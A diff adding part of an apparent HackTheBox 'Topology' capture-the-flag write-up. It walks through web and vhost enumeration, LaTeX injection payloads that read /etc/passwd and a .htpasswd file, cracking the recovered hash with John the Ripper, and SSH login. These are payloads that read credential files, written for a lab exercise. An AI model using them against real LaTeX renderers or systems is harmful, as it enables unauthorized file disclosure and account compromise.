@@ -45,3 +45,84 @@ I added this domain to the hosts file & started running directory & vhots enumer
 While enumerating through the website I found another domain "latex.topology.htb", added it to the host file & browsed through it. I found that this website provides a tool which we can use to generate the ".PNG" files from a Latex math one liner equation.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0c5c0164-4486-4685-85b1-ed14a3969b30)
+
+In the directory enumeration I found few directories, after scanning using go buster:
+
+```bash
+gobuster dir -u http://topology.htb -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o topology_web -b 404,403 -k
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2929a9c5-3312-40fa-9744-c43264dc7e91)
+
+After checking all of those subdirectories, I didn't found any of them as useful.
+
+Then, I checked for the VHOSTS scanned by ffuf & found few results as well:
+
+```bash
+ffuf -H "Host: FUZZ.topology.htb" -u http://10.10.11.217 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 6767
+```
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5a1ebb63-e5e2-47c7-ab7a-1f7fdcc7afc3)
+
+I added all the results to my hosts file & browsed through them.
+
+- Stats domain just showed the image of load on the server, nothing special here.
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/85b341b8-d08f-4c4c-9f36-157197b8a850)
+
+- dev domain popped up a login panel, which looks like if we bypass the logon panel we will get the dev enivronment access.
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d6a4b5b3-ae11-477a-924a-552b5c769810)
+
+I got to know from another writeup that "if HTTP sign in is enabled, we can probably find the credentials in a .htpasswd file somewhere." And since dev enivronment is active we may find it in "var/www/dec/.htpasswd".
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Initial access:
+
+Now, we already discovered that we have some latex math functionality available, I searched further for some exploit & found this [blog](https://0day.work/hacking-with-latex/) for the LFI in latex.
+
+I followed the blog, used the below mentioned payload & found partially working in my case:
+
+```tex
+\newread\file
+\openin\file=/etc/passwd
+\read\file to\line
+\text{\line}
+\closein\file
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2658c6b0-0816-4a5d-9e01-ebccdc04b318)
+
+As per the result we can only see the first line of the result, when I tried to read the full line I got error "illegal command detected":
+
+```tex
+\newread\file
+\openin\file=/etc/passwd
+\loop\unless\ifeof\file
+    \read\file to\fileline 
+    \text{\fileline}
+\repeat
+\closein\file
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/98f44329-cefc-4a39-b3e4-598470952da3)
+
+I was stuck here & tried multiple different payloads until I found this from another writeup:
+
+```tex
+$\lstinputlisting{/etc/passwd}$
+```
+
+As per the writeup it's mentioned that "machine asks for LaTeX inline math mode. There are different modes for LaTeX present, and they would parse characters differently. If we use '$' signs, we can force the machine to process our query by switching mode for it."
+
+So, now we have the perfectly working payload, now let's check the file content of .htpasswd. This gave us the password hash of the user 'vdaisley'.
+
+I checked for the hash algorithm & found it's in "md5crypt-long" format. I used John the ripper to crack this hash & with a minute I got clear text password.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8e7f3b92-3d3f-4398-a70b-b446d5903792)
+
+```bash
+john hash.txt --format=md5crypt-long -w=/usr/share/wordlists/rockyou.txt
+```
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5c2443d2-56cf-427c-9f0a-5e2c12cc446c)
+
+With the cracked credentials I was finally able to login via SSH & retrieved the user flag.(pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/802eafd8-a980-4a4f-901a-b6d5c3853064)
